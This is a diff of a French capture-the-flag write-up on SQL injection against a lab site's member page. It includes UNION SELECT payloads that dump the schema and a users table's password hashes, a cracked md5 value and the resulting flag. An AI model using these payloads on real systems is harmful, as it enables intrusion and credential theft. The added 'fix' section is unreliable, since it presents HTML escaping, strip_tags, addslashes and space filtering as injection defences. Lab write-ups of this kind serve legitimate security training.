@@ -1,5 +1,7 @@
+## La faille
 `ip`/index.php?page=member
 
+## L'explication
 Note: tous les codes suivants ont été insérés dans l'input liée au submit.
 
 si on submit vide, on obtient:
@@ -12,13 +14,13 @@ Voici notre bible pour ce flag : *http://www.sqlinjection.net/column-names/*
 
 `TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
 Notamment, la table:
-
-
+```
 table_schema: Member_Sql_Injection
 table_name: users
-
+```
 `TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
 Notamment:
+```
 table_name: users
 column_name: user_id
 column_name: first_name
@@ -28,7 +30,7 @@ column_name: country
 column_name: planet
 column_name: Commentaire
 column_name: countersign  
-
+```
 Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
 `TRUE UNION SELECT last_name, countersign FROM Member_Sql_Injection.users`
 Nous obtenons pour l'utilisateur GetThe Flag :
@@ -45,3 +47,15 @@ countersign : 5ff9d0165b4f92b14994e5c685cdce28
 En suivant les recommandations du commentaire, nous obtenons:  
 *5ff9d0165b4f92b14994e5c685cdce28* = *FortyTwo* (md5)
 Cryptons ensuite fortytwo (*lower all the char*) en sha256, pour obtenir le flag : *10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5*
+
+## Le fix
+Les methodes suivantes permettent efficacement de se proteger contre les injections lorsque des champs sont remplis par l'user :
+- `mysql_real_escape_string` (concernant les db),
+- `htmlentities()`,
+- `htmlspecialchars()`,
+- `strip_tags()`,
+- `addslashes()`,
+- et globalement en utilisant la PDO
+Il est aussi de bon usage lorsqu'une requete est faite de vérifier deux clés, lorsque cela est possible, afin d'autoriser l'accès au contenu (ex : le champs demandé est le nom d'utilisateur, mais en backend le code vérifie aussi l'identifiant de l'utilisateur loggé).
+Vérifier que la string envoyée ne contient pas d'espaces si cela n'est pas nécessaire
+Parser le retour de la requête plutot qu'en envoyer l'intégralité du contenu
